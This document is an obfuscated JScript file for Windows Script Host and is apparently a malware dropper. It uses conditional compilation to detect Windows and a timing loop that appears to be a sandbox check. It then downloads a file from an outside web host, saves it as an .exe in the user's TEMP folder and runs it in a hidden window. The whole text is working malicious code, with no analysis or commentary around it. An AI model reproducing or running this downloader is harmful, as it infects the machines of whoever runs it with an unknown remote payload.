var Tm = false;
var qQ = "CreateObject";
var Om = function r() {return WScript[qQ]("WScript.Shell");}(), er = 11;
var EM = "MSXML2.XMLHTTP";
var aZ = 2123213;
var d = 0;
function G(B){Om["Run"](B, d, d);};
function yK(){return "" + EM;};
function R(Zv, K0){d = d * 1; return Zv - K0;};
function CX(){return qQ;};
/*@cc_on
  @if (@_win32 || @_win64)
    Tm = true;
  @end
@*/
if (Tm)
{
var c = "";
function Xp(){return 22;};
var R0 = 0; var p = 0;
function U()
{
var K = new this["Date"]();
var o = K["getUTCMilliseconds"]();
WScript["Sleep"](Xp());
var K = new this["Date"]();
var ty = K["getUTCMilliseconds"]();
WScript["Sleep"](Xp());
var K = new this["Date"]();
var i = K["getUTCMilliseconds"]();
var R0 = "H";
R0 = R(ty, o);
var p = "rA";
p = R(i, ty);
c = "open";
return R(R0, p);
}
var wQ = false;
var Q = false;
for (var e = d; e < Xp() * 1; e++){if (U() != d){
wQ = true; 
p = "31" + 11 * R0 + p; 
Q = true; 
break;
}}
function dP() {return ((wQ == true) && (wQ == Q)) ? 1 : d;};
if (wQ && dP() && Q){
function LC() {return Om["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "EhAtIrGWXmL.exe";};
 L = yK();
 J = WScript[qQ](L);
 var F0 = 1;
 while (F0){
try {
J[c]("GET", "http://www.aluguerdiadema.com/p9wsld", false);
J["send"]();
o0 = "Sleep";
for (;;){WScript[o0](Xp() * 11); if (J["readystate"] >= 2 * 2) break;};
F0 = d;
} catch(t){};
}
function XG(F) {var Hr = (1, 2, 3, 4, 5, F); return Hr;};
MD = WScript[CX()]("ADODB.Stream");
L = MD;
L[c]();
L["type"] = XG(1);
L["write"](J["ResponseBody"]);
MD["position"] = XG(d);
L["Save" + "ToFile"](LC(), 2);
MD["c"+"lose"]();
I = LC();
G(I);
}
}

